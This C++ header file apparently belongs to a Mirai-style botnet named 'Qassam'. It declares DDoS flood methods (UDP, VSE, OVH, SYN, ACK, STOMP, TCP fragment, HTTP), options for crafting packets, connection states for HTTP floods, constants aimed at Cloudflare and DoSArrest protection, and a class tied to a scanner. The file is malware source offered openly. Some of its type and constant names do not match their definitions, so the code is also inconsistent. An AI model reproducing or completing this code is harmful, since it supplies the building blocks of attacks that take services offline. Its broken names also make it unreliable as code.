#pragma once

#ifndef QASSAM_QASSAM_ATTACK_HH
#define QASSAM_QASSAM_ATTACK_HH

#include "../qassam_engine.hh"
#include "../qassam_support.hh"
#include "../scanner/qassam_scanner.hh"

using QASSAM_ATTACK_FUNC = void (uint8_t, class QassamAttackTarget *, uint8_t, class QassamAttackOption *);
using QASSAM_ATTACK_VECTOR = uint8_t;

inline constexpr int QASSAM_ATTACK_CONCURRENT_MAX = 5;
inline constexpr int QASSAM_HTTP_CONNECTION_MAX = 500;
inline constexpr int QASSAM_ATTACK_VEC_UDP_PLAIN = 0;
inline constexpr int QASSAM_ATTACK_VEC_STD = 1;
inline constexpr int QASSAM_TK_VEC_TCP = 2;
inline constexpr int QASSAM_ATTACK_VEC_ACK = 3;
inline constexpr int QASSAM_ATTACK_VEC_VSE = 4;
inline constexpr int QASSAM_ATTACK_VEC_OVH = 5;
inline constexpr int QASSAM_ATTACK_VEC_STOMP = 6;
inline constexpr int QASSAM_ATTACK_VEC_SYN = 7;
inline constexpr int QASSAM_ATTACK_VEC_TCPFRAG = 8;
inline constexpr int QASSAM_ATTACK_VEC_HTTP = 9;
inline constexpr int QASSAM_ATTACK_OPT_PAYLOAD_SIZE = 0;
inline constexpr int QASSAM_ATTACK_OPT_PAYLOAD_RAND = 1;
inline constexpr int QASSAM_ATTACK_OPT_IP_TOS = 2;
inline constexpr int QASSAM_ATTACK_OPT_IP_IDENT = 3;
inline constexpr int QASSAM_ATTACK_OPT_IP_TTL = 4;
inline constexpr int QASSAM_ATTACK_OPT_IP_DF = 5;
inline constexpr int QASSAM_ATTACK_OPT_SPORT = 6;
inline constexpr int QASSAM_ATTACK_OPT_DPORT = 7;
inline constexpr int QASSAM_ATTACK_OPT_DOMAIN = 8;
inline constexpr int QASSAM_ATTACK_OPT_DNS_HDR_ID = 9;
inline constexpr int QASSAM_ATTACK_OPT_URG = 11;
inline constexpr int QASSAM_ATTACK_OPT_ACK = 12;
inline constexpr int QASSAM_ATTACK_OPT_PSH = 13;
inline constexpr int QASSAM_ATTACK_OPT_RST = 14;
inline constexpr int QASSAM_ATTACK_OPT_SYN = 15;
inline constexpr int QASSAM_ATTACK_OPT_FIN = 16;
inline constexpr int QASSAM_ATTACK_OPT_SEQRND = 17;
inline constexpr int QASSAM_ATTACK_OPT_ACKRND = 18;
inline constexpr int QASSAM_ATTACK_OPT_GRE_CONSTIP = 19;
inline constexpr int QASSAM_ATTACK_OPT_METHOD = 20;
inline constexpr int QASSAM_ATTACK_OPT_POST_DATA = 21;
inline constexpr int QASSAM_ATTACK_OPT_PATH = 22;
inline constexpr int QASSAM_ATTACK_OPT_HTTPS = 23;
inline constexpr int QASSAM_ATTACK_OPT_CONNS = 24;
inline constexpr int QASSAM_ATTACK_OPT_SOURCE = 25;
inline constexpr int QASSAM_ATTACK_OPT_MIN_SIZE = 26;
inline constexpr int QASSAM_ATTACK_OPT_MAX_SIZE = 27;
inline constexpr int QASSAM_ATTACK_OPT_PAYLOAD_ONE = 28;
inline constexpr int QASSAM_ATTACK_OPT_PAYLOAD_REPEAT = 29;
inline constexpr int QASSAM_HTTP_CONN_INIT = 0;
inline constexpr int QASSAM_HTTP_CONN_RESTART = 1;
inline constexpr int QASSAM_HTTP_CONN_CONNECTING = 2;
inline constexpr int QASSAM_HTTP_CONN_HTTPS_STUFF = 3;
inline constexpr int QASSAM_HTTP_CONN_SEND = 4;
inline constexpr int QASSAM_HTTP_CONN_SEND_HEADERS = 5;
inline constexpr int QASSAM_HTTP_CONN_RECV_HEADER = 6 ;
inline constexpr int QASSAM_HTTP_CONN_RECV_BODY = 7;
inline constexpr int QASSAM_HTTP_CONN_SEND_JUNK = 8;
inline constexpr int QASSAM_HTTP_CONN_SNDBUF_WAIT = 9;
inline constexpr int QASSAM_HTTP_CONN_QUEUE_RESTART = 10;
inline constexpr int QASSAM_HTTP_CONN_CLOSED = 11;
inline constexpr int QASSAM_HTTP_RDBUF_SIZE = 1024;
inline constexpr int QASSAM_HTTP_HACK_DRAIN = 64;
inline constexpr int QASSAM_HTTP_PATH_MAX = 256;
inline constexpr int QASSAM_HTTP_DOMAIN_MAX = 128;
inline constexpr int QASSAM_HTTP_COOKIE_MAX = 5;
inline constexpr int QASSAM_HTTP_COOKIE_LEN_MAX = 128;
inline constexpr int QASSAM_HTTP_POST_MAX = 512;
inline constexpr int QASSAM_HTTP_PROT_DOSARREST = 1;
inline constexpr int QASSAM_HTTP_PROT_CLOUDFLARE = 2;



class QassamAttackTarget
{
    public:
        struct sockaddr_in sock_addr;
        ipv4_t addr;
        uint8_t netmask;
};

class QassamAttackOption
{
    public:
        char *val;
        uint8_t key;
};


class QassamAttackMethod
{
    public:
        ATTACK_FUNC func;
        ATTACK_VECTOR vector;
};


class QassamAttackStompData
{
    public:
        ipv4_t addr;
        uint32_t seq, ack_seq;
        port_t sport, dport;
};


class QassamAttackHttpState
{
    public:
        int fd;
        uint8_t state;
        int last_recv;
        int last_send;
        ipv4_t dst_addr;
        char user_agent[512];
        char path[HTTP_PATH_MAX + 1];
        char domain[HTTP_DOMAIN_MAX + 1];
        char postdata[HTTP_POST_MAX + 1];
        char method[9];
        char orig_method[9];
        int protection_type;
        int keepalive;
        int chunked;
        int content_length;
        int num_cookies;
        char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];
        int rdbuf_pos;
        char rdbuf[HTTP_RDBUF_SIZE];
};

class QassamAttackCfNullState
{
    public:
        int fd;
        uint8_t state;
        int last_recv;
        int last_send;
        ipv4_t dst_addr;
        char user_agent[512];
        char domain[HTTP_DOMAIN_MAX + 1];
        int to_send;
};

class QassamAttacks: public QassamEngine, public QassamSupport, public QassamScanner
{
    public:
        bool qassam_attack_init(void);
        void qassam_attack_kill_all(void);
        void qassam_attack_parse(char *, int);
        void qassam_attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        char *qassam_attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
        int qassam_attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
        uint32_t qassam_attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
        void qassam_attack_method_udpplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        void qassam_attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        void qassam_attack_udp_ovhhex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        void qassam_attack_method_tcp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        void qassam_attack_method_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        void qassam_attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        void qassam_attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        void qassam_attack_method_tcpstomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        void qassam_attack_method_tcpfrag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        void qassam_attack_app_proxy(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        void qassam_attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
        static void qassam_add_attack(ATTACK_VECTOR, ATTACK_FUNC);
        static void qassam_free_opts(struct attack_option *, int);
};




































#endif //QASSAM_QASSAM_ATTACK_HH

